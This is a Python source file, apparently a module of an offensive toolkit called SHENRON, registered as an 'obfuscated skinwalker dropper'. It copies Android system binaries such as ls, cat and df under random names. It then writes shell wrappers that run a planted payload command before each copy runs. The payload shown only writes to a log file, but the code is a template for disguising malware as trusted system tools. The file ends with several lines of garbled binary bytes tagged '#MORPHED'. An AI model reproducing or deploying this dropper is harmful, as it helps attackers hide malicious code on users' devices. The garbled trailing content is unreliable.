from core.engine.payload_registry import register_payload

#!/usr/bin/env python3
# SHENRON Layer: Obfuscated Skinwalker Dropper
# Clones system binaries with fake names and plants active payloads

import os
import shutil
import base64
import random
import string
import subprocess

FAKE_BIN_DIR = os.path.expanduser("~/SHENRON/bin/")
MIMIC_TARGETS = ["/system/bin/ls", "/system/bin/cat", "/system/bin/df"]
PAYLOAD_COMMAND = 'echo "[+] Skinwalker active" >> /data/data/com.termux/files/home/.walker_log'

def random_name():
    return ''.join(random.choices(string.ascii_lowercase, k=8))

def clone_binary(original_path):
    if not os.path.exists(original_path):
        return None
    fake_name = random_name()
    fake_path = os.path.join(FAKE_BIN_DIR, fake_name)
    shutil.copy2(original_path, fake_path)
    os.chmod(fake_path, 0o755)
    print(f"[+] Cloned {original_path} to {fake_path}")
    return fake_path

def plant_payload(fake_binary):
    wrapper_script = fake_binary + "_wrapper.sh"
    with open(wrapper_script, "w") as f:
        f.write(f"#!/system/bin/sh\n{PAYLOAD_COMMAND}\nexec {fake_binary} \"$@\"")
    os.chmod(wrapper_script, 0o755)
    print(f"[âœ“] Payload wrapper created: {wrapper_script}")
    return wrapper_script

@register_payload(name="obfuscated_skinwalker_dropper_AKZd1c_ZRcvQT_CsQrw4_ZiWN6u")
def main():
    os.makedirs(FAKE_BIN_DIR, exist_ok=True)
    for target in MIMIC_TARGETS:
        fake_bin = clone_binary(target)
        if fake_bin:
            plant_payload(fake_bin)

if __name__ == "__main__":
    main()

K9N•t”Fš²3óµğ_B´”¸%,vçZ2Ö#MORPHED

µ”nDn…=08†ÛÔn†Ø‘æÆxe:aóCó_^şĞ=f#MORPHED

‚şWfßbG£Dó	ÿï qİ!¤’#MORPHED

³áº®„í÷Í¹\<+Ş4ÈÅŞd†ÀàÃtínS¹pÏm¯•x&Ùq#MORPHED
